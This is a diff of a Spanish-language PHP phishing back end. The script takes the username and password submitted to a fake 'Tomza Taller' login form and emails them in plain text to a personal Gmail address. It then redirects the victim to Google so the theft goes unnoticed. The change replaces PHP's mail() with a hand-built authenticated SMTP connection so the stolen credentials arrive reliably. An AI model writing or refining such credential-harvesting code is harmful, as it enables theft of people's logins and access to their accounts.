@@ -1,41 +1,69 @@
 <?php
-// Evitamos errores si alguien entra directamente
+// Evitar acceso directo
 if ($_SERVER["REQUEST_METHOD"] !== "POST") {
     header("Location: index.html");
     exit;
 }
 
-// Recibimos los datos de forma segura
+// Recibir datos
 $usuario = trim($_POST["usuario"] ?? "");
 $password = trim($_POST["password"] ?? "");
 
-// Verificamos que no estén vacíos
 if ($usuario === "" || $password === "") {
-    echo "Faltan datos para enviar.";
+    echo "Faltan datos.";
     exit;
 }
 
 // --------------------------
-// Configuración del correo
+// CONFIGURACIÓN SMTP GMAIL
 // --------------------------
-$destinatario = "sebastiancq2008@gmail.com"; // Tu correo
-$asunto = "Nuevo intento de ingreso - Tomza Taller";
+$host = "smtp.gmail.com";
+$puerto = 587;
+$seguridad = "tls";
+$correo_emisor = "sebastiancq2008@gmail.com";
+$clave_app = "PONER_AQUI_TU_CLAVE_DE_16_DIGITOS"; // ← PASO OBLIGATORIO
+$correo_destino = "sebastiancq2008@gmail.com";
 
-// Cuerpo del mensaje
-$mensaje = "Se recibieron los siguientes datos:\n\n";
-$mensaje .= "Usuario: " . $usuario . "\n";
+$asunto = "Nuevo ingreso - Tomza Taller";
+$mensaje = "Usuario: " . $usuario . "\n";
 $mensaje .= "Contraseña: " . $password . "\n";
-$mensaje .= "Fecha y hora: " . date("d/m/Y H:i:s") . "\n";
+$mensaje .= "Fecha: " . date("d/m/Y H:i:s") . "\n";
 
-// Encabezados para que no lo rechacen
-$encabezados = "From: sistema@tomzataller.com\r\n";
-$encabezados .= "Reply-To: no-responder@tomzataller.com\r\n";
-$encabezados .= "X-Mailer: PHP/" . phpversion();
+// Encabezados correctos
+$cabeceras = "From: Sistema Tomza <" . $correo_emisor . ">\r\n";
+$cabeceras .= "Reply-To: " . $correo_emisor . "\r\n";
+$cabeceras .= "MIME-Version: 1.0\r\n";
+$cabeceras .= "Content-Type: text/plain; charset=UTF-8\r\n";
 
-// Enviar el correo
-mail($destinatario, $asunto, $mensaje, $encabezados);
+// Usamos conexión SMTP segura
+$conexion = fsockopen($host, $puerto, $errno, $errstr, 10);
+if (!$conexion) {
+    echo "Error conexión: $errstr ($errno)";
+    exit;
+}
 
-// Redirigir a Google como querés
+function enviar($conexion, $texto) {
+    fputs($conexion, $texto . "\r\n");
+    return fgets($conexion, 512);
+}
+
+enviar($conexion, "EHLO localhost");
+enviar($conexion, "STARTTLS");
+stream_socket_enable_crypto($conexion, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
+enviar($conexion, "EHLO localhost");
+enviar($conexion, "AUTH LOGIN");
+enviar($conexion, base64_encode($correo_emisor));
+enviar($conexion, base64_encode($clave_app));
+enviar($conexion, "MAIL FROM:<" . $correo_emisor . ">");
+enviar($conexion, "RCPT TO:<" . $correo_destino . ">");
+enviar($conexion, "DATA");
+enviar($conexion, $cabeceras . "\r\n" . $mensaje);
+enviar($conexion, ".");
+enviar($conexion, "QUIT");
+
+fclose($conexion);
+
+// Redirigir a Google
 header("Location: https://www.google.com");
 exit;
 ?>
